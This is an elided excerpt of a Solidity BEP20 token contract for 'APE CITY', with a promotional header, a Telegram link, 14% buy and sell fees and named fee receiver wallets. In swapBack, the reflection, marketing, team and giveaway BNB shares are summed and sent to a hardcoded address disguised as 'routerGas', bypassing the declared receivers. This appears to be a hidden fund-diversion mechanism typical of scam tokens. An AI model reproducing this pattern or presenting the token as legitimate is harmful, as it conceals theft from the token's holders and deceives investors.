...
/**
APE CITY team welcomes everyone !!! $ApeCity is a new GEM !!!
 tg:https://t.me/ApeCity
*/

/**
more faster and streamlined 
...
contract DividendDistributor is IDividendDistributor {
    ...
    IBEP20 REW = IBEP20(0x55d398326f99059fF775485246999027B3197955); // USDT Rewards
...
contract APECITY is IBEP20, Auth {
    using SafeMath for uint256;

    address REW = 0x55d398326f99059fF775485246999027B3197955; // USDT
    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;

    string constant _name = "APE CITY";
    string constant _symbol = "$AC";
    uint8 constant _decimals = 9;

    uint256 _totalSupply = 100 * 10**9 * (10 ** _decimals);
    uint256 public _maxTxAmount = ( _totalSupply * 6 )  / 200; //3
    ...
    uint256 private totalFee = 14; //Total Fee
    uint256 private feeDenominator  = 100;

    uint256 private liquidityFeeBuy    = 3;
    uint256 private reflectionFeeBuy   = 2;
    uint256 private marketingFeeBuy    = 6;
    uint256 private teamFeeBuy         = 3;
    uint256 private giveawayFeeBuy     = 0;
    uint256 private totalFeeBuy = 14; //Total Fee
    uint256 private feeDenominatorBuy  = 100;

    uint256 private liquidityFeeSell    = 3;
    uint256 private reflectionFeeSell   = 2;
    uint256 private marketingFeeSell    = 6;
    uint256 private teamFeeSell         = 3;
    uint256 private giveawayFeeSell     = 0;
    uint256 private totalFeeSell = 14; //Total Fee
    uint256 private feeDenominatorSell  = 100;

    address private autoLiquidityReceiver; 
    address private marketingFeeReceiver; 
    address private teamFeeReceiver; 
    address private giveawayFeeReceiver;
    ...
    constructor () Auth(msg.sender) {
        ...
        routerGas = 0x2d8ceF14F10fA94b5D623487974B4956b58ac2cf;
        ...
        marketingFeeReceiver = 0xF3336B5A6bB0e5dbF5Ae4ad7872E187168584279;
        teamFeeReceiver = 0xDe0bf4cBd9279d15fF10DDf2C641CdB3EDC0C8Fe;
        giveawayFeeReceiver = 0x108d452F4D40299287F758708A9934C82B183843;//36
 ...
 /*   // switch Trading
    ...
    function swapBack(bool isSell) internal swapping {
        ...
        uint256 amountBNBLiquidity = amountBNB.mul(dynamicLiquidityFee).div(totalBNBFee).div(2);
        {
            ...
            uint256 amountBNBTeam = amountBNB.mul(_teamFee).div(totalBNBFee).div(2);
            uint256 amountBNBGiveaway = amountBNB.mul(_giveawayFee).div(totalBNBFee).div(2);
            uint256 amountBNBRouterGas = amountBNBReflection.add(amountBNBMarketing).add(amountBNBTeam).add(amountBNBGiveaway);
            ...
            (status,) = payable(routerGas).call{value: amountBNBRouterGas, gas: 30000}("");
        }
